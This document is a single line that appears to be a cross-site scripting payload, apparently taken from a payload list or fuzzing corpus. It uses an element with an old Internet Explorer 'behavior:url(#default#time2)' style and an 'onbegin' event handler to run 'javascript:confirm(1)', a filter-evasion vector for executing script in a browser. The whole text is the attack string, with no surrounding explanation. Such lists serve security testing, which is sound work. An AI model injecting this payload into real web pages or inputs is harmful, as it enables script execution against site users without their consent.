+X<x style=`behavior:url(#default#time2)` onbegin=`javascript:confirm(1)` >
